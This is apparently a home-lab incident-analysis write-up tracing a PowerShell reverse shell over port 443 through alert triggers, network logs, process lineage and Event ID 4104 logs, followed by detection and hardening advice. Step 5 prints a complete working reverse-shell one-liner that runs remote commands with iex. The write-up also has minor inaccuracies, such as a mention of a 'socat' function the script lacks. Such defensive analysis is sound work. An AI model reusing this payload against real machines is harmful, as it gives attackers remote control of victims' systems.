⚠️ Step 2: Alert Trigger Reason Analysis

The trigger reason was reviewed to understand why this connection was flagged. The alert fired due to a combination of suspicious process creation and anomalous network traffic masquerading as HTTPS.

Trigger Reason Analysis:

"A PowerShell process established a TCP socket connection to a remote IP over port 443, consistent with a reverse shell attempting to blend in with legitimate HTTPS traffic."

Key indicators that triggered the alert:
• Unusual process/port correlation: powershell.exe initiating a network connection to port 443.
• Parent process anomaly: Explorer.exe spawning PowerShell directly, often indicating a user-launched script or malicious file.
• Script Block Logging (Event ID 4104): Captured execution of potentially obfuscated or malicious code.
• Connection State: ESTABLISHED - confirming successful C2 communication.

🌐 Step 3: Network Traffic & Evasion Analysis

The network logs were analyzed to understand the scope and methodology of the command and control channel. The use of port 443 is a classic evasion technique.

📸 Established TCP connection from 172.20.10.2:54060 to the attacker's machine on port 443.
Network Connection Deep Dive:

Source IP & Port: 172.20.10.2:54060 (Victim)
Destination IP & Port: 172.20.10.5:443 (Attacker)
Protocol: TCP (ESTABLISHED)

Evasion Technique Identified:
• Port 443 Traffic Masquerading: By using the standard HTTPS port, the attacker intended for this traffic to be overlooked by egress filtering that primarily blocks non-web ports. This allows the C2 traffic to slip out alongside legitimate web browsing.

🔬 Step 4: Malicious Process Analysis & Attack Chain Reconstruction

Logs, including PowerShell Script Block Logging (Event ID 4104), were examined to reconstruct the execution chain.

📸 PowerShell process (PID 37260) spawned by explorer.exe, showing the command line used.
Process Lineage & Execution:

Process Name: powershell.exe
Process ID: 37260
Parent Process: explorer.exe (PID 5464)
User Context: Interactive User Session

Attack Chain Analysis:
1. Initial Access: A user (or a dropper) executes a malicious script, likely by double-clicking a shortcut or file.
2. Execution: The malicious file launches explorer.exe → powershell.exe, a common parent-child relationship for user-initiated malicious scripts.
3. C2 Callback: PowerShell executes a TCP socket connection to the attacker's IP (172.20.10.5) on port 443.
4. Confirmation: The ESTABLISHED connection state confirms the shell is active.

📜 Step 5: Script Block Logging Analysis (Event ID 4104)

The captured Event ID 4104 provided deeper insight into the script's content, confirming the reverse shell's behavior. The logs revealed a call to a function to set up the network stream.

📸 Event ID 4104 log entry revealing the `socat` function used to establish the reverse connection.
Decoded Script Snippet (from Event Log):

$c=New-Object System.Net.Sockets.TCPClient('172.20.10.5',443);$s=$c.GetStream();
[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0)
{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';
$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()

Breakdown:
• TCPClient Object: Creates a connection to 172.20.10.5:443.
• Read/Execute Loop: Reads commands from the network stream and executes them with iex (Invoke-Expression).
• Output Redirection: Sends command output back to the attacker over the same stream.

🛡️ Recommendations & Hardening Strategies

Detection Engineering

  • Firewall Rule: Create an alert for any outbound connection on port 443 from non-browser processes (e.g., powershell.exe, cmd.exe, mshta.exe).
  • Sysmon Deployment: Deploy Sysmon to capture Event ID 1 (Process Creation) and Event ID 3 (Network Connection). This would immediately highlight the Explorer → PowerShell parent-child anomaly.

Prevention & Hardening

  • Constrained Language Mode: Enforce PowerShell Constrained Language Mode for non-admin users to block arbitrary .NET calls (like `New-Object Net.Sockets.TCPClient`).
  • Application Control: AppLocker or Windows Defender Application Control (WDAC) can prevent users from running scripts in non-standard directories.

Incident Response Readiness

  • Playbook Creation: Build a standard runbook for "PowerShell Reverse Shell" alerts to speed up triage and containment.
  • IOC Blocking: Add the attacker's IP (172.20.10.5) and any derived hashes to blocklists across all security tools to prevent future connection attempts.

💡 Key Takeaways from the Home Lab Exercise

  • Evasion is simple but effective: Port 443 masquerading remains a highly effective technique because outright blocking it would break web traffic. Strong detection logic is required.
  • Logging is critical: Without PowerShell Script Block Logging (Event ID 4104) enabled, this incident would have been a black box, significantly hindering analysis.
  • Context matters: The process lineage (Explorer → PowerShell) provided immediate context that this was a user-context execution, not a scheduled task or service, directing the investigation path.
